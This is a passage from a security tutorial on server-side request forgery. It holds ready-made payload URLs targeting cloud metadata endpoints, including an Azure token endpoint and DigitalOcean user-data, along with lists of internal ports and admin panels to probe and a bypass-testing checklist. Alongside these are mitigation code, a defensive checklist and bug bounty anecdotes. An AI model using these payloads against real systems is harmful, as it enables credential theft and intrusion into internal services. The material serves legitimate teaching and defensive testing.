http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```

**DigitalOcean:**

```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
```

### 🎯 Internal Service Discovery

**Common Internal Ports:**

```
http://localhost:80        # HTTP
http://localhost:443       # HTTPS
http://localhost:8080      # Alt HTTP
http://localhost:8443      # Alt HTTPS
http://localhost:8888      # Alt HTTP
http://localhost:9090      # Prometheus/Admin
http://localhost:3000      # Grafana/Dev servers
http://localhost:5000      # Flask default
http://localhost:6379      # Redis
http://localhost:3306      # MySQL
http://localhost:5432      # PostgreSQL
http://localhost:27017     # MongoDB
http://localhost:9200      # Elasticsearch
http://localhost:11211     # Memcached
http://localhost:2375      # Docker API
http://localhost:4243      # Docker API (alt)
```

**Admin Panels:**

```
http://localhost/admin
http://localhost/administrator
http://localhost/wp-admin
http://localhost/manager
http://localhost/console
http://localhost/dashboard
http://localhost:9090/metrics
http://localhost:8080/actuator
http://localhost:8080/health
```

---

## 🛡️ Mitigation Strategies

### For Developers

#### 1. ✅ Whitelist Validation (Strict)

**Best Practice:**

```python
from urllib.parse import urlparse

ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']
ALLOWED_SCHEMES = ['https']

def validate_url(url):
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
        
        # Check hostname
        if parsed.hostname not in ALLOWED_HOSTS:
            return False
        
        # Check for @ symbol (credential bypass)
        if '@' in url:
            return False
        
        # Additional checks
        if parsed.hostname is None:
            return False
            
        return True
    except:
        return False
```

#### 2. ✅ Disable Unnecessary Protocols

**Configuration:**

```python
# Only allow HTTP/HTTPS
ALLOWED_PROTOCOLS = ['http', 'https']

# Disable dangerous protocols
BLOCKED_PROTOCOLS = [
    'file', 'ftp', 'gopher', 'dict',
    'jar', 'ldap', 'tftp', 'sftp'
]
```

#### 3. ✅ Use DNS Resolution Validation

**Prevent localhost access:**

```python
import socket

def is_private_ip(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        
        # Check for private IP ranges
        octets = ip.split('.')
        first = int(octets[0])
        second = int(octets[1])
        
        # 127.0.0.0/8
        if first == 127:
            return True
        
        # 10.0.0.0/8
        if first == 10:
            return True
        
        # 172.16.0.0/12
        if first == 172 and 16 <= second <= 31:
            return True
        
        # 192.168.0.0/16
        if first == 192 and second == 168:
            return True
        
        # 169.254.0.0/16 (Link-local)
        if first == 169 and second == 254:
            return True
        
        return False
    except:
        return True  # Fail secure

def validate_url(url):
    parsed = urlparse(url)
    
    if is_private_ip(parsed.hostname):
        return False
    
    return True
```

#### 4. ✅ Implement Network Segmentation

**Infrastructure:**

```
DMZ (Public)
  ↓
Firewall Rules:
- Block 169.254.169.254
- Block 10.0.0.0/8
- Block 172.16.0.0/12
- Block 192.168.0.0/16
  ↓
Application Servers
  ↓
Firewall Rules:
- Only specific internal IPs
  ↓
Internal Services
```

#### 5. ✅ Disable Redirect Following

**Configuration:**

```python
import requests

# ❌ Bad - Follows redirects
response = requests.get(url)

# ✅ Good - Don't follow redirects
response = requests.get(url, allow_redirects=False)

# ✅ Better - Check redirect location
response = requests.get(url, allow_redirects=False)
if response.status_code in [301, 302]:
    location = response.headers.get('Location')
    if not validate_url(location):
        return "Invalid redirect"
```

#### 6. ✅ Response Filtering

**Don't return raw responses:**

```python
# ❌ Bad - Returns everything
def fetch_url(url):
    response = requests.get(url)
    return response.content

# ✅ Good - Filter response
def fetch_url(url):
    response = requests.get(url, timeout=5)
    
    # Check content type
    content_type = response.headers.get('Content-Type', '')
    if 'image' not in content_type:
        return "Invalid content type"
    
    # Limit response size
    if len(response.content) > 10 * 1024 * 1024:  # 10MB
        return "Response too large"
    
    return response.content
```

#### 7. ✅ Use Authentication for Internal Services

**Even internal services should require auth:**

```python
# ✅ Good - Internal service with auth
@app.route('/admin')
@require_auth
def admin():
    if not is_admin(request.user):
        return "Forbidden", 403
    return render_admin_panel()
```

#### 8. ✅ Implement IMDSv2 (AWS)

**AWS Configuration:**

```bash
# Require IMDSv2 (token-based)
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

### 🎯 Defense in Depth

**Multiple Layers:**

```
1. Input Validation (Whitelist)
2. DNS Resolution Check (Block private IPs)
3. Network Firewall (Block metadata endpoints)
4. No Redirect Following
5. Response Validation
6. Authentication on Internal Services
7. Monitoring & Alerting
8. Rate Limiting
```

---

## 📊 SSRF Testing Checklist

### 🔍 Discovery Phase

- [ ] Identify URL parameters
- [ ] Test webhook features
- [ ] Find file upload/fetch functionality
- [ ] Locate PDF generators
- [ ] Check link preview features
- [ ] Test API integrations
- [ ] Look for proxy services
- [ ] Find import/export features

### 🎯 Basic Testing

- [ ] Test with localhost (127.0.0.1)
- [ ] Try alternative localhost formats
- [ ] Test with 0.0.0.0
- [ ] Try IPv6 localhost ([::1])
- [ ] Test decimal/octal/hex encodings
- [ ] Try internal IP ranges (192.168.x.x)
- [ ] Test cloud metadata endpoints
- [ ] Check for different protocols

### 🔓 Bypass Testing

- [ ] Test URL encoding
- [ ] Try double URL encoding
- [ ] Test case variations
- [ ] Try @ symbol tricks
- [ ] Test # fragment bypass
- [ ] Try embedded credentials
- [ ] Test DNS rebinding
- [ ] Look for open redirects to chain

### 🌩️ Cloud Testing

- [ ] Test AWS metadata (169.254.169.254)
- [ ] Test GCP metadata (metadata.google.internal)
- [ ] Test Azure metadata
- [ ] Check for IMDSv2 bypass
- [ ] Try without required headers
- [ ] Test with injected headers

### 👁️ Blind SSRF

- [ ] Setup Burp Collaborator / interact.sh
- [ ] Test in Referer header
- [ ] Test in User-Agent
- [ ] Test in custom headers
- [ ] Check for time-based detection
- [ ] Test DNS exfiltration
- [ ] Try Shellshock payloads

---

## 🎓 Practice Resources

### 🏋️ Vulnerable Applications

**Free Labs:**

```
✓ PortSwigger Web Security Academy (SSRF labs)
✓ HackTheBox (Various machines)
✓ TryHackMe (SSRF rooms)
✓ PentesterLab (SSRF exercises)
✓ DVWA (SSRF module)
```

### 📚 Learning Resources

**Documentation:**

```
✓ OWASP SSRF Cheat Sheet
✓ PortSwigger Research on SSRF
✓ HackerOne Disclosed Reports
✓ Bug Bounty writeups
```

**Tools:**

```
✓ Burp Suite (Collaborator)
✓ SSRFmap
✓ Gopherus
✓ interact.sh
✓ webhook.site
```

---

## 🏆 Real-World Bug Bounty Examples

### Example 1: Capital One AWS Breach

```
Vulnerability: SSRF → AWS Metadata access
Impact: 100+ million customer records
Bounty: Criminal case (not bug bounty)
Lesson: Always secure cloud metadata endpoints
```

### Example 2: Uber SSRF

```
Vulnerability: SSRF via internal service
Impact: Access to internal dashboards
Bounty: $10,000
Lesson: Internal services need authentication
```

### Example 3: Shopify SSRF

```
Vulnerability: SSRF in image processor
Impact: Access to internal services
Bounty: $25,000
Lesson: Validate all external URLs strictly
```

### Example 4: Google SSRF

```
Vulnerability: SSRF in Google Cloud
Impact: GCP metadata access
Bounty: $13,337
Lesson: IMDSv2 and header validation crucial
```

---

## ✅ Summary

### 🔑 Key Takeaways

**Critical Points:**

```
✓ SSRF allows server to make unintended requests
✓ Can access internal services and cloud metadata
✓ Localhost has many alternative representations
✓ URL parsing vulnerabilities enable bypasses
✓ Open redirects can chain with SSRF
✓ Blind SSRF requires out-of-band detection
✓ Cloud metadata = High-value target
✓ Defense requires multiple layers
✓ Never trust user-supplied URLs
```

**Top Vulnerabilities:**

```
1. Basic SSRF (localhost/internal access)
2. Cloud metadata exploitation (AWS/GCP/Azure)
3. Whitelist bypass (URL parsing confusion)
4. Blind SSRF (out-of-band detection)
5. Protocol smuggling (file://, gopher://, etc.)
6. Port scanning via SSRF
7. Chained with other vulns (open redirect)
8. Shellshock exploitation via SSRF
```

**💡 Golden Rules:**

```
🔍 Test every URL parameter
🎯 Try all localhost variations
🌐 Always check cloud metadata
🔐 Chain with other vulnerabilities
📊 Use out-of-band for blind SSRF
🛠️ Automate internal network scanning
📝 Document all findings
🤝 Report responsibly
```

---

_Remember: This guide is for authorized security testing only. Always obtain proper authorization before testing any system. Report vulnerabilities responsibly and ethically._ 🔐

**Happy Hunting! 🎯🚀**